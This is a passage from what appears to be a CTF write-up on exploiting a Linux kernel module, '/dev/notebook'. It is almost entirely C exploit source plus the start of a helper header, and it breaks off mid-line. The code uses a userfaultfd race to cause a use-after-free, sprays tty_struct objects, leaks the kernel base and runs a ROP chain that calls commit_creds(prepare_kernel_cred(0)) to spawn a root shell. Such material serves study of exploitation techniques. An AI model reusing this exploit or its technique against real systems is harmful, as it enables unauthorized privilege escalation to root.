class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span>* msg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>&#123;</span><br><span class="line">    note* noteBuf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(note) * <span class="number">0x10</span>);</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="keyword">if</span>(printInfo)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%02d: size = %#zx, pointer = %p\n&quot;</span>, i, noteBuf[i].size, noteBuf[i].note);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> noteBuf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteedit((<span class="type">int</span>)args, <span class="number">0x2000</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteadd((<span class="type">int</span>)args, <span class="number">0x50</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span><span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = (<span class="type">int</span>)uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully entered registered userfaultfd!\n\033[m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">50</span>);      <span class="comment">// stop here</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read((<span class="type">int</span>)uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get root privilege&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully get root shell!\n\033[m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;edit_thread, <span class="literal">NULL</span>, noteedit_exp, (<span class="type">void</span>*)i); <span class="comment">// trigger page fault, freeing all notes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mCreated 16 paused thread of edit and freeing all notes.\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;edit_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(hit_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to access tty_struct in notes.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fake_stack_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to find fake stack address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully accessed tty_struct in note #%d, address: %p\n\033[m&quot;</span>, hit_idx, hit_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake tty_struct_operations in note #%d, address: %p\n\033[m&quot;</span>, fake_ttyops_idx, fake_ttyops_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake stack in note #%d, address: %p\n\033[m&quot;</span>, fake_stack_idx, fake_stack_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to get base address of kernel by file_operations ptr.\n\033[m&quot;</span>);</span><br><span class="line">    <span class="type">u_int64_t</span> tty_operation = ((<span class="type">u_int64_t</span>*)ttyinfo)[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mtty_operations address: %p\n\033[m&quot;</span>, (<span class="type">void</span>*)tty_operation);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (ptm_unix98_ops &amp; <span class="number">0xFFF</span>))     <span class="comment">// this file_operations is ptm_unix98_ops</span></span><br><span class="line">        offset = tty_operation - ptm_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (pty_unix98_ops &amp; <span class="number">0xFFF</span>))    <span class="comment">// this file_operations is pty_unix98_ops</span></span><br><span class="line">        offset = tty_operation - pty_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        errExit(<span class="string">&quot;Unexpected tty_operations address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address got.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> base_address = kernel_BASE + offset;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)() = (<span class="type">void</span>(*)())(commit_creds_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*prepare_kernel_cred)() = (<span class="type">void</span>(*)())(prepare_kernel_cred_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*swapgs_restore_regs_and_return_to_usermode)() = (<span class="type">void</span>(*)())(SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address: %zx.\n\033[m&quot;</span>, base_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mOffset: %zx.\n\033[m&quot;</span>, offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mcommit_creds: %p.\n\033[m&quot;</span>, commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mprepare_kernel_cred: %p.\n\033[m&quot;</span>, prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mswapgs_restore_regs_and_return_to_usermode: %p.\n\033[m&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to trigger the first stack pivoting.\n\033[m&quot;</span>);</span><br><span class="line">    noteedit(fake_ttyops_idx, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations), page);</span><br><span class="line">    noteedit(fake_stack_idx, <span class="number">0x100</span>, page);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> original_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    read(fd, original_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mUnchanged tty_struct content:\n\033[m&quot;</span>);</span><br><span class="line">    print_binary(original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fake_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty, original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[<span class="number">0x200</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_ops, <span class="number">0</span>, <span class="keyword">sizeof</span> fake_tty_ops);</span><br><span class="line">    <span class="type">size_t</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret = <span class="number">0xffffffff81238d50</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write = (<span class="type">int</span> (*)(<span class="keyword">struct</span> tty_struct *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">int</span>)) (</span><br><span class="line">            push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mfake_tty_operations edited, write pointer: %p\n\033[m&quot;</span>, ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;35mFirst gadget:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpush rdi;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rsp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rbp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tadd rax, rdx;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tret;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This gadget is used to migrate rsp to tty_struct in note #%d.\n\033[m&quot;</span>, hit_idx);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbx_pop_rbp_ret = <span class="number">0xffffffff81002141</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rsp_rbp_pop_rbp_ret = <span class="number">0xffffffff8107875c</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">1</span>] = pop_rbx_pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">3</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_ttyops_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">4</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbp_ret = <span class="number">0xffffffff81000367</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">1</span>] = pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">2</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_stack_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">3</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff81045833</span>;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> ropidx = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;     <span class="comment">// for pop rbp</span></span><br><span class="line">    rop[ropidx++] = pop_rdi_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)prepare_kernel_cred;    <span class="comment">// prepare_kernel_cred(NULL);</span></span><br><span class="line">    rop[ropidx++] = mov_rdi_rax_pop_rbp_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)commit_creds;           <span class="comment">// commit_creds(prepare_kernel_cred(NULL));</span></span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)&amp;getShell;</span><br><span class="line">    rop[ropidx++] = user_cs;</span><br><span class="line">    rop[ropidx++] = user_rflags;</span><br><span class="line">    rop[ropidx++] = user_sp;</span><br><span class="line">    rop[ropidx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, fake_stack_idx);</span><br><span class="line">    write(fd, fake_tty_ops, fake_ttyops_idx);</span><br><span class="line">    write(fd, fake_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mEvil data written, ready to exploit....\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        write(ptmx_fds[i], page, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uffdexploit.h:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: 